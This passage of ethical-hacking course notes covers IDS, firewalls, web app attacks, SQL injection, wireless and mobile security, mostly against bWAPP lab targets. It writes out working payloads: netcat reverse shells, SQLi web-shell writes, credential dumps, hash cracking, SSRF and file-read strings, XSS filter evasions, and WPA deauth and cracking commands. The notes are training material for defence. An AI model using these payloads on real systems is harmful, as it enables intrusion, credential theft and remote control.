                - Get an anonymous session token
                    - Craft an email link (social engineering)
                        - User clicks link
                            - Gets sent to login page to authenticate
                                - User logs in and continues to use session token from Phish
                                    - Attacker can now use the same session token and be authenticated as the target user
                                    - Donation
                                    + Same as Fixation with one small change
                                    - Attacker uses their authenticated session token
                                    - CSRF
                                    + DEMO (just explain and show the effect, don't show setup)
                                    - Attack Setup
                                    + Login to 'bank' website and transfer a small amount
                                    + Grab the URL
                                    + Modify the POST data in the URL
                                    - Increase the transfer amount to 100
                                    + Get Target to click malicious link
                                    - Social Engineering
                                    - XSS
                                    + Set this as Stored XSS in 'blog'
                                    - Target
                                    + Clicks malicious link
                                    + Browses to Stored XSS page
                                    - Session ID prediction
                                    + http://example.com/webapp?sessid=3
                                    - What happens when you change '3' to '0'?

***Session Hijecking Countermeasures*
1. List and describe session hijacking detection methods
2. Explain commonly employed protections against session hijacking attacks
3. Define session hijacking specific security control mechanisms
- How do we protect against session hijacking attacks?
    - Detection
        - Manually detect
            - More network traffic than normal
            - Packet inspection with Wireshark
            - ARP Cache Entries
        - Automation
            - IDS/IPS
            - SIEM w/real-time threat protection
- What about preventative measures?
    - Switch to encrypted protocols and applications
        - Telnet < SSH
        - HTTP < HTTPS
        - IP < IPsec
    - Web Apps
        - End-Users
            - ALWAYS LOG OUT!
            - Don't click links in emails
        - Web App Devs/Admins
            - Use randomization for session IDs
            - No session for unauthenticated users if possible
            - Generate new session IDs after login
            - Verify session is coming from same host
                - Look at things like source IP and User Agent string
            - Set sessions to expire after logout
- Set sessions to expire more quickly

## Module 12
**IDS and IPS Concepts**
1. Define what an IDS/IPS is and explain its function and basic process
2. List and define the different types of IDS/IPS
- What is an IDS?
    - Network traffic inspection for known attack signatures/behaviors
        - Protocol Anomaly Detection
    - Placement can be inside, outside, or on both sides of your network
        - Detection generates an alert
- What is an IPS?
    - Like an IDS, but can take action to stop detected attacks
        - "Active" IDS
- Types of Intrusion Detection and Prevention Systems
    - Network Based
    - Host Based
- IDS/IPS Alert Types
    - True Positive => Attack detected & Alert Sent
    - False Positive => False Alarm (no attack but Alert was sent)
    - True Negative => No attack and therefore no Alert
    - False Negative => Attack not detected & no Alert
- IDS/IPS Solutions
    - Snort
        - Snort Rules found in /etc/snort/rules/
            - Check out scan.rules
                - Explain some of the details of a rule
                    - Mention custom rules
        - DEMO Snort
            - FROM LINUX LITE
            - `sudo snort -A console -q -c /etc/snort/snort.conf -i ens33 -K ascii`
                - -A = Alert Type
                - -q = Quiet. Don't show banner or status report
                - -c = Config file
                - -i = Network adapter
                - -K = Output type (default is pcap)
            - FROM PARROT
                - `sudo nmap -sX -n -Pn -F 192.168.241.136`
            - LOGS
                - /var/log/snort/IP/
                    - cat files in that dir for packet info (sudo needed)
    - Bro/Zeek
    - AlienVault
    - Suricata
    - Mobile
- IDS/IPS Evasions
    - We've talked about some already
        - Packet Fragmentation
        - Decoys
        - Obfuscations
- Defenses
    - Baselines
    - Updates and patches
    - Block known-bad

**Firewalls**
1. Define what an IDS/IPS is and explain its function and basic process
2. List and define the different types of IDS/IPS
- What is a firewall?
    - Could be Hardware or Software
        - Why not both?
    - Doorman(are you on the list?)
        - Demo simple ACL with iptables
- How are firewalls typically deployed?
    - A couple of different ways
        - Gateways/Bastion Host
        - DMZ or 'Screened Subnet'
        - Multi-homed
- Firewalls Technology Types
    - Packet Filtering
    - Circuit-Level Gateway
    - Application-Level
    - Stateful (combo of Packet+Curcuit+Application)
    - Proxy
    - NAT
    - VPN
- Firewall Evasions
    - Firewalking for detection
    - IP Spoofing
    - Fragmentation
    - Proxy
    - Tunneling Traffic
        - SSH
        - HTTP
        - ICMP
        - DNS
    - MiTM
    - Social Engineering/Phishing
- Defense against evasions?
    - Implicity Deny
    - Rules for both Ingress AND Egress
    - Logging and monitoring

**Honeypots**
- What is a Honeypot?
    - IT'S A TRAP!!!
- Types of Honeypots
    - Low-Interaction
        - Narrow set of available services/apps
    - Medium-Interaction
        - Mimics a 'realistic' host
            - OS
            - Apps
            - Services
- High-Interaction
    - Deploys ALL production services
- Pure
    - Mimics real production host/network
- Honeypot solutions
    - https://www.honeynetproject.com/honeypots.html
    - https://sourceforge.net/projects/honeydrive/

## Module 13
**Web Server Hacking Concepts**
1. Define what a web server is and its function
2. List the components of a web server
3. List and define common security vulnerabilities found in web servers 
4. List and explain common security controls, tools and strategies used to combat attacks against web servers
- Web Server basics
    - HTTP Server software
        - Apache
        - NGNX
        - IIS
    - HTTP Server Components
        - Document Root 
            - Where is your index.html?
        - Server Root
            - Where is your server configs, logs, cgi-bin
        - Virtual Host
            - Using multiple names for the same site
        - Web Proxy
            - Proxy that should be used
- What makes web servers vulnerable?
    - Lacking OS updates/patches
    - Using defaults
    - Poor/no Authentication
    - OS/HTTP_server/Website/Permissions misconfiguration
    - Software vulns
        - They are running web apps
            - Those apps could also have security issues
- Countermeasures?
    - DMZs / Network segmentation and firewalling
    - WAFs
    - Patches and updates
    - Change defaults
    - File permissions
    - Secure coding
    - Filtering od user input and acceptable file types
    - Disable directory listing 
    - Use encryption
    - Honeypot the site
    - Disable errors
    - Be vague with responses

**Web Server Attacks**
- What kinds of attacks to web servers face?
    - DoS
    - Directory Traversal
        - Use dir traversal to access source code to current page.
            - See that code makes a call to admin/settings.php
                - Use traversal to read admin/settings.php
                    - See MySQL DB creds
                        - Use creds to access DB remotely
                            - `mysql -u root -p -h 192.168.241.140`
    - Phishing
    - Defacement
        - Deface a page
    - Brute force remote administration
        - RDP
        - SSH
    - HTTP Response Splitting
        - Create a newline with %0d%0a
        - Add a header
            - Cookie, Content-Type, Referer, etc
    - Web Cache Poisoning
        - Requires HTTP Response Splitting vulnerability
        - Delete target web cache server's content
        - Use HTTP Response Split to inject new malicious site into cache
    - SSRF (Server Side Request Forgery)
        - Abuse of requests by the web app to web server to access internal resources
            - Detection
                - Look for parameters like
                    - /file=
                    - /path=
                    - /src=
                    - Port scan
        - payload = src=http://127.0.0.1:PORT
            - File Read
        - payload = src=file:///etc/passwd

**Web Server Hacking Methodology**
- What is the common method used to attack web servers?
    - Recon
        - Ports (HTTP/HTTPS)
        - Service Enumeration (Apache, Nginx, IIS)
        - Banners
    - Vulnerability Scan
        - Nikto
        - Skipfish
    - Directory Fuzzing
        - Gobuster
        - Dirb
        - robots.txt
    - Abuse Defaults
        - Login creds
        - Config files
            - phpinfo
            - apache
    - Web App Attack
        - Vulnerability Scan Results
        - Manual testing for vulns/exploits
            - Burp Suite
            - ZAP

## Module 14
**Web App Basics**
- Is this a concept and vocabulary episode?
    - Absolutely!
- So define a Web Application for us.
    - An in browser software application that allow users to interact with remote resources via web technologies like
        - HTTP
        - PHP
        - Python
        - JavaScript
- Can you explain th SOAP and REST web services?
    - SOAP (Simple Object Access Protocol)
        - XML- Based requests and responses
        - Web Servicees Description Language (WSDL)
            - Defines how the web service works
    - REST (Representatinal State Transfer)
        - URL based requests
        - Uses HTTP Methods/ Verbs to perform tasks
            - GET 
            - POST
            - PUT
            - DELETE
- What are the common security risk types associated with web apps?
    - We're going to take a closer look at the OWASP top 10 but real quick
        - Injectins
        - Security Misconfigurations
        - Broken Access
        - Using Components with known Vulns
- How about security defenses?
    - Security testing
        - SAST
        - DAST
        - Tools for atuomated and manual security testing
    - Fuzz testing
        - Checking inputs
            - Size 
            - Char type
        - Fuzz strategies
            - Mutation = Takes normal data and transforms it
            - Generation = takes the input model that was provided by the user to generate new inputs.
            - Protocol-based = forges packets based off of protocol specific functionality
    - Encoding 
    - Whitelisting and Blacklisting
    - Content Filtering / input Senitization
    - WAF
    - RASP (Runtime Application Self Protection)
        - Intercepts all calls from the app to thee system
            - Verifies they don't do anything deemed 'unsafe'
    - Bug bounty programs
        - bugcrowd
        - hackerone

**OWASP Top 10 Web Application Attacks (2017)**
- What is OWASP and what are the 'Top 10' lists?
A1: Injection
A2: Broken Auth
A3: Sensitive Data Exposure
A4: XML External Entities
A5: Broken Access Control
A6: Security Misconfiguration
A7: Cross-Site Scripting
A8: Insecure Deserialization
A9: Using Components with Known Vulnerabilities
A10: Insufficient Logging and Monitoring

**Unvalidated Redirects and Forwards**
- Unvalidated Redirect
    - Used in phishing attacks to direct victim to malicious site
        - Malicious site = clone of valid site
            - User then 'logs in'
                - Creds are harvested by attacker
                    - Victim is forwarded to legit site
- Unvalidated Forward
    - Attacker can access restricted pages

**CSRF**
- How does CSRF work?
    - Abuses trust relationship established between the victim and web app
        - Get user to do stuff they don't know about or intend to do
    - Requires an active session
- What do we need to make this work?
    - URL
        - A8: CSRF change password for user
            - Grab URL with Burp
                - Modify parameters to desired password
- How does this change the password for target?
    - Phishing/Social Engineering
        - csrf.html
            - If user has active session and clicks phish, then their password will be reset to attacker controlled value
- How can you make this work with XSS?
    - Find XSS (Stored works best)
        - `<script>new Image().src=</script>`
            - Check the account amount

**IDOR**
- What is IDOR
    - Insecure Direct Object Reference
        - Allows user to manipulate perameters that should be hidden
- How does this work?
    - Use the Firefox dev tools to change ticket price in bwapp

**LFI/RFI**
- What is LFI and RFI?
    - Local File Inclusion
    - Remote File Inclusion
- RFI seem dangerous. Can we see that in action?
    - Create shell.php file and serve with Python
        - Start listener
            - Browse to http://bee-box/bWAPP/rlfi.php
                - Choose a language and submit
                    - Modify URL for RFI to Parrot/shell.php
                        - Check listener :)
- Can you show us a few quick examples of an LFI?
    - sqlitemanager is vulnerable
        - http://bee-box/sqlite
            - Google for sqlitemanager exploit
                - Exploit-db has the hit
                    - Tamper with cookie
                        - Use Burp Repeater for the request to /sqlite
                            - Add parameters from exploit-db
                                - Get file :)
- Can you get system access with LFI like RFI?
    - 'Find' LFI here http://bee-box/bWAPP/rlfi.php
        - Look for ability to read mail from /var/mail/username
            - 'Find' mail for www-data
                - `nmap -T4 -p 25 bee-box`
                    - `nc -nv bee-box 25`
                        - EHLO billy
                        - MAIL FROM: sales@pwned.com
                        - RCPT TO: www-data
                        - DATA
                            - Add a newline/carriage return
                                - Create a PHP shell
                                    - `<?php $shelly = shell_exec('nc -nv -e /bin/bash bee-box 9999');?>`
                                - Add a newline/carriage return
                                - End message with a period(.)
                            - QUIT
        - Start listener
        - Use LFI to include mail for www-data
        - Check listener

**Web App Hacking Methodology**
- What are the first steps towards successfully hacking a Web App?
    - Recon | Footprinting
- Once we've identified the moving parts, what's next?
    - Do a vulnerability assessment
        - Find inputs
        - Enumerate software and server-side technologies
        - Find where the app is generating dynamic content
        - Map out the web app's files and directories
        - Find areas that could have commonly vulnerable coding errors
        - Create a plan of attack / map the attack surface
- So now we're ready to attack the web app?
    - Yes.
        - You're going to follow your attack map
            - But, attacks could be...
                - Login/Authentication bypass
                    - Injections
                    - Brute force
                - Authorization attacks
                    - HTTP Parameter Tampering
                    - POST data tampering
                - Logic Flaws
                    - Can I just bypass the 'payment' page?
                - Injections
                - Client-based
                    - XSS
                    - CSRF
                    - Redirects and Forwards

**Web App Hacking Tools**
- What are a few useful tools for web app hacking
    - Nikto
    - Skipfish
    - WP-Scan
    - Burp Suite
    - ZAP

**Web App Login Attacks**
- What are ways to attack login forms?
    - Injection
    - Brute-force
    - SQLi

**XSS Filtering Evasion**
- List of filtering evasion techniques
    - Character Encoding
        - https://www.asciitable.com
        - HTML Elements
            - &#x6A; (hex) or &#106; (decimal)
                - Starts with &#
                - Ends with ;
            - Further aided by zero padding
                - &#000000x6A;
                - Zeros are ignored, but change the string for filter evasion
        - Base64
        - Whitespace
            - Space
            - Tab
            - Newline
        - Script Tag Manipulation
            - Get weird
                - Mixed case
                - script in script
                 `<sc<script>ript>`
        - Polyglots

**Web Shell Backdoors**
- What is a Web Shell?
    - Hidden web page uploaded by an attacker for clandestine administration
- How are they deployed?
    - You have to find a way to upload
        - Unprotected upload apps
        - SQLi
        - LFI/RFI
- Can you protect from this?
    - File type filtering is common for upload portals
- Any way around filtering?
    - Messing with file extensions

**APIs and Webhooks**
- What is an API?
    - A single web service that can facilitate multiple online sources
        - Less complexity
    - API Services
        - SOAP
        - REST
        - RESTful
        - XML
        - JSON
- What is a webhook?
    - Push notifications
- API Security Risks
    - OWASP Top 10 API Security Risks
        - https://owasp.org/www-project-api-security/
    - SQLi
    - IDOR
    - Auth/Access insecurity
    - DDoS
- API Hacking Methodology
    - Identify the Target
    - Detect security standards
    - Identify the attack surface
    - Launch Attack
- Security countermeasures for APIs and Webhooks
    - API
        - Sanitize User Input
        - Firewalls
        - Rate-Limiting
        - Parameterized Statements
        - Pagination
        - Rate-limiting and throttling
        - MFA
    - Webhooks
        - Require authentication
        - Blacklist calls from unauthorized sources
        - Webhook signing
        - Timestamps
            - X-Cld-Timestamp (timing attacks)
            - X-OP-Timestamp

## Module 15
**SQL Injection Concepts**
1. Define what SQLi is 
2. List and explain the different types of SQLi
3. Explain and demonstrate methods used to discover SQLi vulnerabilities
4. Explain the process of a SQLi  attack and why it works
5. List and explain common types of SQLi IDS signature evasion techniques
6. List and describe common security controls and best practices to secure systems against SQLi
- What is SQL Injection and why are we concerned about it?
    - Modifying back-end SQL queries
        - User can inject T-SQL into original query
    - WHY Concern?
        - CIA of data is compromised
            - Data can be
                - Extracted 
                - Modified
                - Deleted
                - Access of target's local file-system
                - Remote access to Target's system commands
- How does this happen?
    - Insecure coding
        - Trusts user input
- SQL injection types?
    - Authentication Bypass
        - Demo an AUTH Bypess and show the code from DVWA to explain
    - Error based SQLi
    - Bline SQLi
- How do we discover a possible SQL injection point?
    - Manual Discovery
        - Look for visible input
            - Login forms
            - Dynamic Site pages
            - Search boxes
            - URLs with things like '?id=1'
            - Invisible input
                - Page source
                - API calls (DEMO) (Just show the API injection Point)
    - Automation
        - Vulnerability Scanners
        - SQLi Specific Vulnerability scanners
        - SQLmap
        - SQLNinja
        - Mobile sqli tools
- What are some common defenses against SQL Injection?
    - Regex filtering aka Input Validation
        - Look for special characters and strings used in SQLi
    - WAFs
    - Least privilege
    - Parameterized statements
        - Prepared statements
- Are there ways around these defenses?
    - Query Obfuscations
        - Inline Comments
        - Null bytes(%00)
        - Use variables
    - Encoding special chars
        - Hex
        - URL
    - Concatenation
    - Uncommon queries
        - Look for 'OR DOG=DOG' instead of 'OR 1=1'

**Error based SQLi Attacks**
1. Explain and demonstrate how to use Error-based SQLi to access sensitive
- What do we mean by 'error' based?
    - Make web app print SQL error to screen
        - Confirms the SQL injection
- How do we do this?
    - Testing for injection
        - The single-quote (') is your friend
            - Double-quotes can work as well
- Now that we have a possible injection point, where do we go next?
    - ORDER BY
        - Sorts results in set by ascending or descending order
            - Or in this case by column number
        - `iron' order by 1 --`
            - Increase the number by 1 until you receive an error
                - Now you know how many columns
- Now that we have the columns identified, what do we do next?
    - UNION SELECT
        - `iron' union select 1,2,3,4,5,6,7 --`
            - You can now see where usable areas are
                - They will be selected for output fields
                    - `iron' union select 1,user(),3,4,@@version,6,7 --`
- So, we're now interacting with the SQL database and it just dumps info to the web page! If we have this kind of control, where do we go from here?
    - TABLE enum
        - `...1,table_name,3,4,5,6,7 FROM information_schema.tables --`
    - COLUMN enum
        - `...1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users' --`
    - Read COLUMN info
        - `...1,login,3,4,password,6,7 FROM users --`
            - Save creds to file
            - Check hash type with hash-identifier and crack with hashcat
                - `hashcat -m 100 -a 0 nixPass.txt /usr/share/wordlists/rockou.txt --force`

**Blind based SQLi Attacks**
1. Explain and demonstrate how to use Bline-based SQLi to access sensitive information
- Today we're looking into 'Blind' SQL Injection what does that mean?
    - No Visible indicators of a (un)successful injection
- Are there techniques that we can use to verify whether or not an injection is successful?
    - Boolean- based
    - Time-based
- Can you show us an example of a Boolean-Based Injection?
    - Boolean Demo
        - Test for SQLi with single-quote(')
            - Custom error returned, but it looks like special char filtering 
        - Try Boolean injection
            - TRUE/FALSE conditions
            - ' OR 1=1 -- - is TRUE
            - ' OR 1=3 -- - is FALSE
                - One or both could be usefull
        - Now we continue with ORDER BY column enumeration
            - iron man' order by 1 -- -
                - Site throws custom error when invalid column is requested
                    - iron man' order by 8 -- -
                        - 'invalid Syntax Detected!'
                            - Now we know there are 7 columns in the table
                                - Then continue DB enumeration with UNION SELECT
- You also mentioned Time-based Blind Injections? How does that work
    - Lack of feedback from injection tests
        - bWAPP Time-based Challenge doesn't return ANY ERRORS!
            - Must fine some way of verifying test success / failure
                - Timed responses
- So we force, the app to wait before it responds?
    - Add -sleep() to the test 
        - iron man' -sleep(1) -- -
            - The site should 'sleep' for 10 seconds, then return results
                - If site hangs, then SQLi test is successful
                    - This becomes our success/failure indicator
                        - iron man' order by 1 -- - has no indication of success/fail
                        - iron man' order by 8 -- - has no indication of success/fail
                            - Add -sleep(0.5) to make it hang 5 seconds
                        - iron man' -sleep(0.5) order by 1 -- - hangs, Success!
                        - iron man' -sleep(0.5) order by 8 -- - no hang, Failure!
                            - We can then deduce thaat there are 7 columns in the table

**SQLi to system Access**
1. Utilize SQL Injection to access the local file system of a remote system
2. Leverage SQL Injection to create an interactive connection with a remote system
- We've seen a lot of what we can do with SQL Injection. Are there any other kinds of things can we accomplish with SQL injection?
    - Lots of dangerous things
       - Local file-system manipulation
            - READ
            - WRITE
            - CODE/COMMAND EXECUTION
- That does sound dangerous! Can you show use a quick example of reading from the target's local file system?
    - READ from file
        - union all select 1,load_file("/etc/passwd"),3,4,5,6,7 -- -
            - View source for better formatting of output
- Can we read ANY file we want?
    - Only the files that the SQL user has access to
- You also said we can write, to the local file system. What does that look like?
    - WRITE to file
        - union all select 1,"Test",3,4,5,6,7 into OUTFILE '/var/www/test.txt' -- -
            - You may get permission denied
                - Find writeable dir
                    - Check links, source, and robots.txt
                        - Trial and error through the listed directories
                            - Found writeable dir: /documents
                                - CODE/COM EXEC may now be possible :)
- We can now both READ and WRITE to the Target's local file-system, but how do we leverage this for CODE/COMMAND EXECUTION?
    - CODE EXEC
        - union all select 1,"<?php echo shell_exec($_GET['cmd'];?>)",3,4,5,6,7 into OUTFILE '/var/www/bWAPP/documents/x.php'
            - Browse to http://bee-box/documents/x.php
            - Success!
- So we were able to add a new page to the website, but what do we do now?
    - We listen
        - Start a listener on port 4444
            - Now browse to your backdoor and execute a command
- http://bee-box/bWAPP/documents/x.php?cmd=nc -nv 10.0.0.169 4444 -e /bin/bash

**SQLMap**
-Doing this manually is great, but are there tools available to help us - automate this process?
    - Yes. Do a google search for sqli tools
        - SQLMap is our go-to
- OK so we've got SQLMap, but how do we release it upon our target?
    - INJECTION TESTING
        - Gathering commonly needed elements
            - Cookies
            - POST data (if data not in URL)
        - sqlmap --url="http://bee-box/bWAPP/slqi_1.php?title=iron" --dbs
            - --dbs info is found using the -hh option of sqlmap
            - Add --cookie="security_level=0;PHPSESSID=xxxxxx"
                - the bwapp app requires it
            - If POST then add --data="title=iron&action=search"
                - Input data and parameters are usually found in the request BODY
- So we have a good injection point and even enumerated the name of the database, but how do we get at the data?
    - Enumerate the Table names
        - sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --tables
    - Enumerate Columns
        - sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP -T users -- columns
    - Dump database data from table 'users' from columns 'login' and 'password'
        - sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP -T users -C login,password --dump
- Any other useful tricks?
    - How about COMMAND EXECUTION?
        - sqlmap --url="http://bee-box/bWAPP/sqli_1.php?title=iron" -D bWAPP --os-shell
            - PHP shell, since this is a PHP app
            - Custom web root (/var/www/bWAPP/documents/)

## Module 16
**Wireless Basics**
- Wireless features
    - AP (Access Point)
    - WLAN (Wireless Local Area Network)
    - BSSID (Basic Service Set Identifier)
        - MAC address of the AP
    - SSID (Service Set Identifier)
        - The 'name' of the AP
        - Maximum length of 32 bytes
    - Association
        - Connecting to an AP
- Wireless Standards
    - 802.11 is the main standard
        - 802.11a
            - 5Ghz
            - 35-100 meters
            - 54 Mbps
        - 802.11b
            - 2.4Ghz
            - 35-140 meters
            - 11 Mbps
        - 802.11g
            - 2.4Ghz
            - 38-140 meters
            - 54 Mbps
        - 802.11n
            - 2.4Ghz | 5Ghz
            - 70-250 meters
            - 54 -600 Mbps
- Authentication Types
    - Open
        - Any device can 'authenticate' or associate with the AP
    - Pre-Shared Key
        - Basically a password
    - Centralized Authentication
        - RADIUS server
- Types of antenna
    - Directional
        - Yagi (UHF/VHF)
    - Omnidirectional
    - Parabolic Grid (grid meaning 'what the dish material is made of')
    - Reflector
        - Reflects and concentrates EM radiation
- Wireless Encryption
    - WEP
        - 24-bit static IV
            - Sent in cleartext
        - RC4 (Rivest Cypher 4)
            - The IV makes up part of the encryption key
            - 40 - 104 bit length
        - CRC-32
            - No cryptographic integrity protection
    - WPA
        - 48-bit IV
        - RC4 + TKIP (Temporal Key Integrity Protocol)
            - Generates new key for each packet
            - 128 bit length
        - Predictable Group Temporal Key(GTK)
            - From an insecure Random Number Generator
            - Allows for injection and decryption of traffic
        - Password cracking
    - WPA2
        - 48-bit IV
        - AES-CCMP
            - Counter Mode Cypher Block Chaining Message Authentication Code Protocol
            - 128 bits
        - 2 modes
            - Personal
                - Uses PSK
            - Enterprise
                - Uses centralized authentication
    - WPA3
        - AES-GCMP 256
        - Galois/Counter Mode
        - 192 bit
        - Personal and Enterprise modes

**Wireless Threats**
- Authentication Attacks
    - Brute-force the password/PSK
- Rouge AP
    - Installed into target network allowing 'backdoor' access
- Evil Twin
    - Client mis-association
- Honeypot AP
    - Looks like a commonly trusted SSID
        - Coffee shop
        - Restaurants
- Soft AP (Soft as in Software)
    - Installed as malware
    - Malware turns device into AP allowing attacker to access internal resources
- Denial of Service Attacks
    - De-authentication attack
        - Attacker sends de-authentication frame
    - Disassociation attack
        - Attacker sends disassociation frame
- Jamming
    - Cell and WiFi
- KRACK
    - Key Re-installation Attack (WPA/WPA2 vuln)
    - Performed by blocking message 3 of the 4-way handshake
        - AP will re-transmit M3 multiple times with the same nonce
            - This reuse will make the encryption susceptible to attack
    - Attacker creates a fake access point with same ESSID on a different channel
        - Attacker performs MITM attack
- Spoofing Client MAC
    - Bypass MAC filtering

**Wireless Hacking Tools**
- WiFi Discovery
    - inSSIder
    - NetSurveyor
    - mobile
- GPS Mapping
    - https://www.wigle.net
    - https://www.wifimap.io
- Traffic Analysis
    - Wireshark
        - sudo airmon-ng start <wireless_adapter>
        - sudo wireshark
            - View > Wireless Toolbar
- Wireless Attack Tools
    - aircrack-ng suite
        - https://aircrack-ng.org/
    - wifite
        - https://github.com/derv82/wifite
    - fern wifi cracker
        - https://github.com/savio-code/fern-wifi-cracker

**Wireless Hacking**
- MAC Spoofing
    - Bypass MAC Filtering
        - 1. sudo airmon-ng start wlan0
        - Record the BSSID if the target device
        - 2. sudo airodump-ng -c 6 --bssid <Target_MAC> -w psk wlan0mon
        - This will show connected clients MAC addresses
        - 3. sudo airmon-ng stop wlan0mon
        - 4. sudo ifconfig wlan0 down
        - 5. sudo ifconfig wlan0 hw ether <Client_MAC>
        - 6. sudo ifconfig wlan0 up
        - 7. Connect to MAC filtered wireless network
- De-authentication Attack
    - Follow the same steps above to discover clients for deauth
        - Then...
            - `sudo aireplay-ng --deauth 25 -h <Client_MAC> -b <Target_MAC> wlan0`
- WPA Cracking
    - Put wireless card into monitoring mode
        - airmon-ng -start wlan0
        - Find BSSID of target AP
            - airodump-ng wlan0mon
            - Record BSSID and channel of Target AP
        - Monitor target AP
            - `airodump-ng -c 6 --bssid 00:1C:DF:89:84:9F -w ceh.cap wlan0mon`
            - -c = channel number
            - -w = write out file location
        - Wait for 4-way handshake or force with aireplay-ng
            - Force 4-way handshake
                - `aireplay-ng -0 2 -a 00:1C:DF:89:84:9F -c <clientMAC> wlan0mon`
                    - Check the airodump-ng capture for 4-way handshake
        - Time to crack the WPA key
            - `aircrack-ng -a2 -b 00:1C:DF:89:84:9F -w ~/Documents/rockyou.txt *.cap`
                - Record the cracked PSK
        - Return wireless device to normal operation
            - airmon-ng stop wlan0mon
            - service networkmanager start
        - Attempt to connect to Target AP with cracked PSK

**Wireless Hacking Countermeasures**
- Wireless Security Controls
    - Patches/Updates
        - Clients
        - Firmware for APs
    - Change AP defaults
        - Opt into the security features of your AP
            - APs are insecure by default so that you can access it out of the box
                - The assumption is that you will enable the security features
                    - Security features need to be unique to your environment
    - Strong PSK passwords/phrases
        - No dictionary words here
        - Sufficient length and complexity
        - Passwords are like underwear
            - They will eventually stink, so change often!
    - Use the strongest encryption possible
        - No less than WPA2
            - Enterprise is best
    - SSID Obfuscation
        - To broadcast or not to broadcast? That is the question!
            - aka SSID Cloaking
        - Change the default SSID
            - Can be too descriptive (make, model, etc)
    - Disable remote login!
    - Add extra layers of protection
        - NAC/NAP
            - https://www.packetfence.org/
        - VPN
        - Network segmentation
            - Firewall/IDS/IPS
                - https://www.cisco.com/c/en/us/products/wireless/adaptive-wireless-ips-software/index.html
    - Forbid public wifi use!
    - Physical security of devices
    - Scheduled audits
        - Wifi surveys
            - Compare results to baselines
            - Update baselines whenever approved changes are made
            - Heat maps
                - Control AP placement and/or signal strength to keep signal from bleeding signal into untrusted areas
                    - Parking lots
                    - Adjacent buildings
        - Packet Capture and Analysis

## Module 17
**Mobile Hacking Basics**
- Mobile Attack Surfaces
    - Mobile Device itself
    - Bluetooth
        - Bluesnarfing
            - Attacker is able to connect to victim without auth to see contacts, email, calendars, text messages, pictures, etc
        - Bluebugging
            - Similar to Bluesnarfing
        - Blueborne
    - Wifi
    - Telco (cellular)
        - SS7 (Common Channel Signaling System No.7)
        - Outdated protocol providing interoperability between providers
            - Services
                - SMS
                - Billing
                - Call waiting/forwarding
        - Attacker can tap into this network using a laptop and the SS7 SDK
            - Attacker can then eavesdrop on conversations
    - App Stores/Apps
        - 3rd-party app stores can host malware apps
        - Official app stores have been infiltrated from time to time
    - Web
    - VPN
- OWASP Top 10 Mobile Risks
    - https://owasp.org/www-project-mobile-top-10/
- Other Mobile security issues
    - Sandbox bypass/escape
    - Mobile Spam
        - SMShing
        - Vishing
            - NSO Group (Pegasus/Darknet Diaries)

**Android Security**
- Android OS
    - Developed by Google
    - Linux based
    - Open-source
    - Most used OS for smartphones and tablets (since 2011 and 2013 respectively)
    - App development and device administration
        - https://developer.android.com/
        - https://developer.android.com/guide/topics/admin/device-admin
- Rooting
    - Gaining full 'root' level control of device
    - Pros
        - You can bypass device controls
            - Allowing 'privileged' functionality
                - install apps on SD card
                - Tethering
                - Delete bloatware
    - Cons
        - Voided warranty
        - Malware infection
        - Brick the device
    - Rooting Tools
        - Place your device into 'USB debugging' mode then use tool of choice
            - KingoRoot
            - KingRoot
            - Towelroot
            - One Click Root
- Android Hacking Tools
    - Yup!
        - DoS attacks
            - NetCut
            - LOIC
        - Vuln Scans
            - drozer
        - zANTI
            - https://www.zimperium.com/zanti-mobile-penetration-testing
        - Web Session Hijacking
            - DroidSheep
                - https://droidsheep.info
            - Android Debug Bridge (ADB)
                - Android communications
                    - Install and debug apps
                    - Shell access
            - cSploit
                - https://www.csploit.org
- Android Security Defenses
    - Don't Root
    - Use screen lock
    - Don't install apps from 3rd-party app stores
    - Don't side-load apps
    - Install AV/Anti-Malware
        - Kaspersky
        - Avast
        - Sophos
    - Updates/Patches
    - Don't open links/attachments
    - Use VPN
    - Enable Location services / Find by Device
        - Find my Phone
        - Where's my Droid

**IOS Security**
- Apple iOS
    - Released in 2007
    - Runs on Apple exclusively
    - App Store
    - Has many security features built-in
        - Secure Boot
        - Face ID | Passcode | Touch ID
        - Code signing for 3rd-party apps
        - Sandboxing
- Jailbreaking
    - Gives users root access to OS
    - Pros
        - Removes sandbox restrictions
        - Install 3rd-party unsigned apps
    - Cons
        - Warranty voided
        - Malware Infection
        - Brick the device
    - Jailbreaking Techniques
        - Tethered
            - Devices boots normally
                - May get stuck in a partially booted state
                    - Device must be tethered to computer and re-jailbroken
                        - Use the 'boot tethered' feature of jailbreaking tool
                - Semi-Tethered
                    - Device boots normally
                    - If jailbroken functionality is required, device must be tethered to a computer and jailbreaking tool must be used
                - Untethered
                    - Device will be in 'jailbroken' state even after reboots
                    - Doesn't require the help of a computer
                        - The kernel is now patched
                - Semi-Untethered
                    - Similar to Semi-Tethered
                    - Device boots normally
                    - Device can be patched without a computer
                        - Patch is applied by an app on the device
    - Jailbreaking Tools
        - Cydia
        - Hexxa Plus
- iOS Hacking and Hacking Tools
    - Info Gathering Tool
        - Network Analyzer Pro
    - Trustjacking
        - Attacker can remotely read messages, emails, and sensitive info, etc
            - Apple mobile devices can sync with iTunes over Wifi
                - 'Trust this device'
                    - Attacker gets victim to plug mobile into computer
                        - Click 'yes' to trust this device prompt
                            - Attacker can now access victim data through iTunes 'Wifi Sync
    - iOS Malware
        - https://www.theiphonewiki.com/wiki/Malware_for_iOS
        - https://www.washingtonpost.com/investigations/interactive/2021/nso-spyware-pegasus-cellphones/
    - iOS Hacking Tools
        - Pegasus
        - Elcomsoft Phone Breaker
            - https://www.elcomsoft.com/eppb.html
        - Spyic
            - https://spyic.com/
- iOS Security Defenses
    - Don't Jailbreak
    - Use screen lock
    - Don't install untrusted 3rd-party apps
    - Don't side-load apps
    - Updates/Patches
    - Don't open links/attachments
    - Use VPN
    - Don't use random Wifi
    - Enable Location services / Find by Device
        - Find my iPhone
    - Use a password manager
    - Disable services like wifi/bluetooth/location when not in use
    - Use a mobile security suite
        - Trend Micro Mobile Security
        - Norton Security for iOS
        - McAfee Mobile Security
        - Should have anti-spyware

**Mobile Device Management**
- The need for MDM
    - Allows admins to easily manage mobile devices regardless of OS
        - Enable authentications
        - Remote lock/wipe
        - Jailbreak/Root detection
        - Policy enforcement
        - Inventory Tracking
        - Real-time monitoring/reporting
    - ManageEngine Mobile Device Manager Plus
